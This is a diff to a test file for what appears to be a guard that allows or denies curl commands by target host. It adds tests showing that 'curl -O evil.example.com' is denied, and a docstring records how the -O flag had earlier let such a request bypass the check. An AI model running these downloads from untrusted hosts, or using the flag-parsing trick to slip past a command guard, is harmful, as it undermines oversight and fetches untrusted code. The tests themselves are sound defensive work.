@@ -85,3 +85,13 @@ def test_config_flag_value_is_not_skipped():
     value stays host-matched (over-blocks the filename — safe direction —
     rather than blessing an opaque config). (security review on #847)"""
     assert _decide("curl -K some.config.txt https://api.github.com/x") == "deny"
+
+
+def test_curl_dash_O_does_not_skip_target_host():
+    """curl's -O (--remote-name) takes NO argument — it must not consume the
+    request target. `curl -O evil.com` had bypassed the check when -O was
+    wrongly in the value-flag set (Devin #847). The target stays checked."""
+    assert _decide("curl -O evil.example.com") == "deny"
+    assert _decide("curl -O https://evil.example.com/x") == "deny"
+    # an allowlisted target with -O is still allowed
+    assert _decide("curl -O https://api.github.com/x") == "allow"
